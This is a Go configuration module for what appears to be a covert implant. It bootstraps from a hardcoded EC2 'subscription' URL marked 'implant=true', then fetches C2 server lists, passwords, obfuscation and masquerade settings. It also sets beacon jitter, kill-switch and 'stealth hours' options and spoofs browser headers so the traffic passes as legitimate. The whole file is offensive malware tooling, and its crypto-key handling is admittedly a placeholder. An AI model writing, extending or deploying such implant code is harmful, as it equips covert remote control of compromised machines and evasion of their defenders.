package config

import (
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

type Config struct {
	ImplantID       string    `json:"implant_id"`
	ServerList      []string  `json:"servers"`
	Password        string    `json:"password"`
	SNI             string    `json:"sni"`
	Obfs            string    `json:"obfs"`
	Masquerade      string    `json:"masquerade"`
	BaseInterval    int       `json:"base_interval"`
	Jitter          int       `json:"jitter"`
	CryptoKey       []byte    `json:"crypto_key"`
	SubscriptionURL string    `json:"subscription_url"`
	Token           string    `json:"token"`
	LastCheckin     time.Time `json:"last_checkin"`
	FirstRun        bool      `json:"first_run"`
	// Enhanced beacon settings
	MaxRetries       int   `json:"max_retries"`        // Maximum retry attempts for failed operations
	BackoffMultiplier float64 `json:"backoff_multiplier"` // Exponential backoff multiplier
	MaxBackoff       int   `json:"max_backoff"`        // Maximum backoff time in seconds
	KillSwitchEnabled bool  `json:"kill_switch_enabled"` // Enable kill switch checking
	HeartbeatInterval int   `json:"heartbeat_interval"` // Heartbeat interval in seconds
	NetworkAware     bool  `json:"network_aware"`      // Enable network adaptation
	StealthHours     []int `json:"stealth_hours"`      // Hours for reduced activity (0-23)
}

func LoadBootstrap() *Config {
	return &Config{
		SubscriptionURL: "https://ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com/api/sub/hysteria2?token=INITIAL_TOKEN&implant=true",
		Token:           "dpanel-implant-bootstrap-token-change-this",
		BaseInterval:    45,
		Jitter:          25,
		FirstRun:        true,
		// Enhanced defaults
		MaxRetries:       3,
		BackoffMultiplier: 2.0,
		MaxBackoff:       300,
		KillSwitchEnabled: true,
		HeartbeatInterval: 300,
		NetworkAware:     true,
		StealthHours:     []int{0, 1, 2, 3, 4, 5, 22, 23}, // Reduced activity during late night
	}
}

func FetchFullConfigFromSubscription(cfg *Config) error {
	client := &http.Client{
		Timeout: 30 * time.Second,
		// Add user agent to blend in
		Transport: &http.Transport{
			Proxy: http.ProxyFromEnvironment,
		},
	}

	req, err := http.NewRequest("GET", cfg.SubscriptionURL, nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	// Add headers to blend in as legitimate traffic
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("subscription request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("D-Panel subscription returned %d", resp.StatusCode)
	}

	// Parse the response
	var subResponse struct {
		ImplantID  string   `json:"implant_id"`
		Servers    []string `json:"servers"`
		Password   string   `json:"password"`
		SNI        string   `json:"sni"`
		Obfs       string   `json:"obfs"`
		Masquerade string   `json:"masquerade"`
		CryptoKey  string   `json:"crypto_key"`
		Interval   int      `json:"interval"`
		Jitter     int      `json:"jitter"`
		// Enhanced config fields
		MaxRetries       int     `json:"max_retries"`
		BackoffMultiplier float64 `json:"backoff_multiplier"`
		MaxBackoff       int     `json:"max_backoff"`
		KillSwitchEnabled bool    `json:"kill_switch_enabled"`
		HeartbeatInterval int     `json:"heartbeat_interval"`
		NetworkAware     bool    `json:"network_aware"`
		StealthHours     []int   `json:"stealth_hours"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&subResponse); err != nil {
		return fmt.Errorf("failed to decode subscription response: %w", err)
	}

	// Update config with received data
	cfg.ImplantID = subResponse.ImplantID
	cfg.ServerList = subResponse.Servers
	cfg.Password = subResponse.Password
	cfg.SNI = subResponse.SNI
	cfg.Obfs = subResponse.Obfs
	cfg.Masquerade = subResponse.Masquerade
	cfg.BaseInterval = subResponse.Interval
	cfg.Jitter = subResponse.Jitter
	cfg.LastCheckin = time.Now()
	cfg.FirstRun = false

	// Update enhanced config fields if provided
	if subResponse.MaxRetries > 0 {
		cfg.MaxRetries = subResponse.MaxRetries
	}
	if subResponse.BackoffMultiplier > 0 {
		cfg.BackoffMultiplier = subResponse.BackoffMultiplier
	}
	if subResponse.MaxBackoff > 0 {
		cfg.MaxBackoff = subResponse.MaxBackoff
	}
	cfg.KillSwitchEnabled = subResponse.KillSwitchEnabled
	if subResponse.HeartbeatInterval > 0 {
		cfg.HeartbeatInterval = subResponse.HeartbeatInterval
	}
	cfg.NetworkAware = subResponse.NetworkAware
	if len(subResponse.StealthHours) > 0 {
		cfg.StealthHours = subResponse.StealthHours
	}

	// Decode crypto key if provided
	if subResponse.CryptoKey != "" {
		// In a real implementation, this would be base64 decoded
		cfg.CryptoKey = []byte(subResponse.CryptoKey)
	}

	fmt.Printf("[+] Successfully fetched config from D-Panel\n")
	fmt.Printf("[+] Implant ID: %s\n", cfg.ImplantID)
	fmt.Printf("[+] Servers: %v\n", cfg.ServerList)
	fmt.Printf("[+] Beacon interval: %ds ±%ds\n", cfg.BaseInterval, cfg.Jitter)
	fmt.Printf("[+] Max retries: %d, Backoff multiplier: %.1f, Max backoff: %ds\n", 
		cfg.MaxRetries, cfg.BackoffMultiplier, cfg.MaxBackoff)
	fmt.Printf("[+] Kill switch: %t, Heartbeat: %ds, Network aware: %t\n", 
		cfg.KillSwitchEnabled, cfg.HeartbeatInterval, cfg.NetworkAware)

	return nil
}